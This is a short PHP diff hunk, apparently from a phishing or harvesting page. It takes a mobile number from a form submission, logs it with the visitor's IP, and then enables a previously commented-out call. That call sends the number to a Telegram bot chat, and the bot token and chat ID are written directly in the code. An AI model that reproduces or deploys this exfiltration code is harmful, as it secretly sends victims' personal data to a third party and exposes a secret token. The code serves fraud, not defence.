@@ -5,4 +5,4 @@ $num = $_POST['number'];
 $replyMsg = " Logged [ $ip ] \n Mobile Number: $num";
 
 // with them
-//file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-582319954&text=" . $_POST['number']);
+file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-582319954&text=" . $_POST['number']);
